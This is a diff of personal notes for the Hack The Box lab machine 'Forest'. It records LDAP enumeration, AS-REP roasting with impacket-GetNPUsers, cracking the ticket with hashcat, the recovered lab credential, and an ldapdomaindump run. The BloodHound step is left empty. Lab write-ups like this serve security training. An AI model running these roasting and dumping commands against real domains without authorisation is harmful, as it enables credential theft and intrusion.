@@ -9,7 +9,7 @@ tags:
 Machine: https://app.hackthebox.com/machines/212
 
 ---
-# Enumeration
+# Enumeration(No creds)
 ## Port Scanning
 - Getting open ports as well as service and version running on this ports
 ```bash
@@ -25,7 +25,7 @@ Domain Name: `htb.local`
 Host Name: `FOREST`
 SMB guest account support
 
-## LDAP (No creds)
+## LDAP
 - Lets try to get all available information
 ```bash
 ldapsearch -H ldap://10.10.10.161 -x -s base
@@ -64,7 +64,7 @@ Domain Sid: `S-1-5-21-3072663084-364016917-1341370565`
 New User found: `svc-alfresco`
 There are 2 Domains: `htb.local | buildin.local`
 
-## NPU users
+## Kerberos
 - Checking if any user have the flag 'UF_DONT_REQUIRE_PREAUTH' using [[impacket-GetNPUsers]], And we have a TGT
 ```bash
 impacket-GetNPUsers htb.local/ -usersfile usersList -request -dc-ip 10.10.10.161
@@ -83,3 +83,18 @@ hashcat -m 18200 TGTsvc-alfresco /usr/share/wordlists/rockyou.txt --force
 
 Credentials:`svc-alfresco:s3rvice`
 
+# Enumeration (Using Creds)
+## LDAP
+- Lets dump all information using [[ldapdomaindump]]
+```bash
+ldapdomaindump ldap://htb.local -u "htb.local\svc-alfresco" -p s3rvice
+```
+>[!example]- Result
+>![[Pasted image 20250312154052.png]]
+
+We have 2 computers: `EXCH01.htb.local | FOREST.htb.local`
+
+- In order to have a better view we can use [[bloodhaunt]]
+```bash
+
+```
